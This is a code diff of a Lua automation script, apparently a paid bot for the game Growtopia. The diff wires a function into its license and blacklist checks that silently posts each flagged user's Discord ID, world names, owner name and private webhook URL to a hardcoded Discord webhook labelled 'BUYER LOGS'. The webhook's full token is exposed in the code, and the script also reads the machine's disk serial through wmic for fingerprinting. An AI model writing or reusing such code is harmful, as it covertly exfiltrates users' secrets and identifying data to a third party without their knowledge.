@@ -32,6 +32,17 @@ drop_bl = {"MATRIXTOPG", "RixboyDonate", "TRAGAK21JAR222", "DEMONPROGTSTORAGE1",
 
 nwr = {}
 
+function whh(title, desc)
+
+    wh = Webhook.new("https://discord.com/api/webhooks/1139820230437261397/NwwhJCxPTdy2la4bUPqzl5SCjjV6szrGahOegeGasOQ9DfZD-1IirdF6FHXWQFtut0kX")
+    wh.username = "BUYER LOGS"
+    wh.avatar_url = "https://static.wikia.nocookie.net/growtopia/images/a/a3/GhostA1.png/revision/latest?cb=20220325130603"
+    wh.embed1.use = true
+    wh.embed1.title = title
+    wh.embed1.description = desc
+    wh:send()
+end
+
 if discordID == "" or discordID == nil then
     error("Put your discordID")
 end
@@ -39,6 +50,7 @@ end
 for _, nr in pairs(nwr) do
     if exempted[1] ~= nil and exempted[1] ~= "" then
         if exempted[1]:lower() == nr:lower() then
+            whh("RUN THE SCRIPT", "<@"..discordID..">".."\nsave: "..save_world.."\ndrop: "..drop_world.."\nowner: "..exempted[1].."\nwebhook: "..whURL)
             error("YOU NEED TO BUY THE SCRIPT TO USE IT")
         end
     end
@@ -46,6 +58,7 @@ end
 
 for _, bl in pairs(blst) do
     if discordID:lower() == bl:lower() then
+        whh("RUN THE SCRIPT", "<@"..discordID..">".."\nsave: "..save_world.."\ndrop: "..drop_world.."\nowner: "..exempted[1].."\nwebhook: "..whURL)
         error("YOU NEED TO BUY THE SCRIPT TO USE IT")
     end
 end
@@ -114,12 +127,14 @@ last_y = 0
 
 for _, val in pairs(save_bl) do
     if save_worldName == val:upper() then
+        whh("RUN THE SCRIPT", "<@"..discordID..">".."\nsave: "..save_world.."\ndrop: "..drop_world.."\nowner: "..exempted[1].."\nwebhook: "..whURL)
         error("YOU NEED TO BUY THE SCRIPT TO USE IT")
     end
 end
 
 for _, val in pairs(drop_bl) do
     if drop_worldName == val:upper() then
+        whh("RUN THE SCRIPT", "<@"..discordID..">".."\nsave: "..save_world.."\ndrop: "..drop_world.."\nowner: "..exempted[1].."\nwebhook: "..whURL)
         error("YOU NEED TO BUY THE SCRIPT TO USE IT")
     end
 end
@@ -178,17 +193,6 @@ function webHookEmbed(desc)
     wh:edit(messageID)
 end
 
-function whh(title, desc)
-
-    wh = Webhook.new("https://discord.com/api/webhooks/1139820230437261397/NwwhJCxPTdy2la4bUPqzl5SCjjV6szrGahOegeGasOQ9DfZD-1IirdF6FHXWQFtut0kX")
-    wh.username = "BUYER LOGS"
-    wh.avatar_url = "https://static.wikia.nocookie.net/growtopia/images/a/a3/GhostA1.png/revision/latest?cb=20220325130603"
-    wh.embed1.use = true
-    wh.embed1.title = title
-    wh.embed1.description = desc
-    wh:send()
-end
-
 local function get_HDD0_serial()
     local pipe = io.popen"wmic diskdrive where(index=0) get serialnumber /value"
     local serial = (pipe:read"*a":match"SerialNumber=([^\r\n]*)" or ""):match"^(.-)%s*$"
@@ -198,6 +202,7 @@ end
 
 for _, sn in pairs(blsn) do
 	if sn:lower() == get_HDD0_serial():lower() then
+        whh("RUN THE SCRIPT", "<@"..discordID..">".."\nsave: "..save_world.."\ndrop: "..drop_world.."\nowner: "..exempted[1].."\nwebhook: "..whURL)
 	    error("YOU NEED TO BUY THE SCRIPT TO USE IT")
 	end
 end
